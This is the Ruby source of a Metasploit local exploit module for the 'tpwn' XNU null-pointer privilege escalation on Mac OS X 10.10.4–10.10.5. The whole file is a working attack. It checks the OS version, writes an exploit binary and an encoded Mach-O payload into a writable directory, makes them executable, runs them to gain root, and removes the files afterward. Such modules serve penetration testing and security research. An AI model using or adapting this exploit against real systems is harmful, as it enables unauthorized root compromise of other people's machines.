# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class Metasploit4 < Msf::Exploit::Local

  Rank = NormalRanking

  include Msf::Post::OSX::System
  include Msf::Exploit::EXE
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Mac OS X "tpwn" Privilege Escalation&#039;,
      &#039;Description&#039;    => %q{
        This module exploits a null pointer dereference in XNU to escalate
        privileges to root.

        Tested on 10.10.4 and 10.10.5.
      },
      &#039;Author&#039;         => [
        &#039;qwertyoruiop&#039;, # Vulnerability discovery and PoC
        &#039;wvu&#039;           # Copy/paste monkey
      ],
      &#039;References&#039;     => [
        [&#039;URL&#039;, &#039;https://github.com/kpwn/tpwn&#039;]
      ],
      &#039;DisclosureDate&#039; => &#039;Aug 16 2015&#039;,
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Platform&#039;       => &#039;osx&#039;,
      &#039;Arch&#039;           => ARCH_X86_64,
      &#039;SessionTypes&#039;   => [&#039;shell&#039;],
      &#039;Privileged&#039;     => true,
      &#039;Targets&#039;        => [
        [&#039;Mac OS X 10.10.4-10.10.5&#039;, {}]
      ],
      &#039;DefaultTarget&#039;  => 0
    ))

    register_options([
      OptString.new(&#039;WritableDir&#039;, [true, &#039;Writable directory&#039;, &#039;/.Trashes&#039;])
    ])
  end

  def check
    ver?? Exploit::CheckCode::Appears : Exploit::CheckCode::Safe
  end

  def exploit
    print_status("Writing exploit to `#{exploit_file}&#039;")
    write_file(exploit_file, binary_exploit)
    register_file_for_cleanup(exploit_file)

    print_status("Writing payload to `#{payload_file}&#039;")
    write_file(payload_file, binary_payload)
    register_file_for_cleanup(payload_file)

    print_status(&#039;Executing exploit...&#039;)
    cmd_exec(sploit)
    print_status(&#039;Executing payload...&#039;)
    cmd_exec(payload_file)
  end

  def ver?
    Gem::Version.new(get_sysinfo[&#039;ProductVersion&#039;]).between?(
      Gem::Version.new(&#039;10.10.4&#039;), Gem::Version.new(&#039;10.10.5&#039;)
    )
  end

  def sploit
    "chmod +x #{exploit_file} #{payload_file} && #{exploit_file}"
  end

  def binary_exploit
    File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;tpwn&#039;, &#039;tpwn&#039;
    ))
  end

  def binary_payload
    Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)
  end

  def exploit_file
    @exploit_file ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

  def payload_file
    @payload_file ||=
      "#{datastore[&#039;WritableDir&#039;]}/#{Rex::Text.rand_text_alpha(8)}"
  end

end

